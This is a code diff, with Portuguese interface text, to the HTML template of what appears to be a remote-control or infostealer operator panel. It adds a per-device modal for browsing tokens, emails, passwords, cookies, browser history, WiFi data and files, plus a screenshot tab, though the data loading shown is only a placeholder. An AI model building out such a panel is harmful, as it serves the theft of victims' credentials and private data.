@@ -488,7 +488,7 @@ HTML_TEMPLATE = """
         <div class="tabs-container">
             <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
             <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
-            <button class="tab" onclick="showTab('data')">Dados</button>
+            <button class="tab" onclick="showTab('data')">Logs</button>
         </div>
         
         <div id="endpoints" class="tab-content active">
@@ -512,21 +512,12 @@ HTML_TEMPLATE = """
         </div>
         
         <div id="data" class="tab-content">
-            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
+            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Logs</h2>
             <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('tokens')">🔑 Tokens</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('emails')">📧 Emails</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('passwords')">🔒 Senhas</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('cookies')">🍪 Cookies</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('history')">📜 Histórico</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('wifi')">📶 WiFi</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('system')">⚙️ Sistema</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="showDataCategory('files')">📁 Arquivos</button>
-                </div>
-                
-                <div id="dataContent" style="min-height: 400px;">
-                    <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
+                <div style="text-align: center; padding: 40px; color: #6b7280;">
+                    <h3>📋 Sistema de Logs</h3>
+                    <p>Logs de atividades e eventos do sistema</p>
+                    <p style="margin-top: 20px; font-size: 0.9rem; color: #9ca3af;">Funcionalidade em desenvolvimento...</p>
                 </div>
             </div>
         </div>
@@ -840,7 +831,91 @@ HTML_TEMPLATE = """
         }
         
         function showDeviceData(endpointId) {
-            alert(`Dados do dispositivo ${endpointId}\n\nFunção em desenvolvimento...`);
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0, 0, 0, 0.8);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+            `;
+            
+            modal.innerHTML = `
+                <div style="background: rgba(17, 17, 27, 0.95); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px; padding: 30px; max-width: 800px; width: 90%; max-height: 80vh; overflow-y: auto;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px;">
+                        <h2 style="color: #a855f7; margin: 0;">📊 Dados do Dispositivo</h2>
+                        <button onclick="this.closest('.modal').remove()" style="background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 0px; padding: 8px 12px; cursor: pointer;">✖ Fechar</button>
+                    </div>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px;">
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'tokens')">🔑 Tokens</button>
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'emails')">📧 Emails</button>
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'passwords')">🔒 Senhas</button>
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'cookies')">🍪 Cookies</button>
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'history')">📜 Histórico</button>
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'wifi')">📶 WiFi</button>
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'system')">⚙️ Sistema</button>
+                        <button class="tab" style="padding: 15px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2); border-radius: 0px;" onclick="loadDeviceData('${endpointId}', 'files')">📁 Arquivos</button>
+                    </div>
+                    <div id="deviceDataContent" style="margin-top: 20px; min-height: 200px;">
+                        <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
+                    </div>
+                </div>
+            `;
+            
+            modal.className = 'modal';
+            document.body.appendChild(modal);
+        }
+        
+        function loadDeviceData(endpointId, category) {
+            const contentDiv = document.getElementById('deviceDataContent');
+            contentDiv.innerHTML = '<div style="text-align: center; padding: 40px; color: #6b7280;">Carregando...</div>';
+            
+            // Simulação - você pode implementar chamadas reais aqui
+            setTimeout(() => {
+                contentDiv.innerHTML = `
+                    <div class="data-section">
+                        <h3>${getCategoryIcon(category)} ${getCategoryName(category)}</h3>
+                        <div style="text-align: center; padding: 40px; color: #6b7280;">
+                            <p>Dados do dispositivo ${endpointId}</p>
+                            <p style="margin-top: 10px; font-size: 0.9rem;">Categoria: ${category}</p>
+                            <p style="margin-top: 20px; color: #9ca3af;">Funcionalidade em desenvolvimento...</p>
+                        </div>
+                    </div>
+                `;
+            }, 500);
+        }
+        
+        function getCategoryIcon(category) {
+            const icons = {
+                'tokens': '🔑',
+                'emails': '📧',
+                'passwords': '🔒',
+                'cookies': '🍪',
+                'history': '📜',
+                'wifi': '📶',
+                'system': '⚙️',
+                'files': '📁'
+            };
+            return icons[category] || '📊';
+        }
+        
+        function getCategoryName(category) {
+            const names = {
+                'tokens': 'Tokens',
+                'emails': 'Emails',
+                'passwords': 'Senhas',
+                'cookies': 'Cookies',
+                'history': 'Histórico',
+                'wifi': 'WiFi',
+                'system': 'Sistema',
+                'files': 'Arquivos'
+            };
+            return names[category] || 'Dados';
         }
 
         async function loadTokens() {
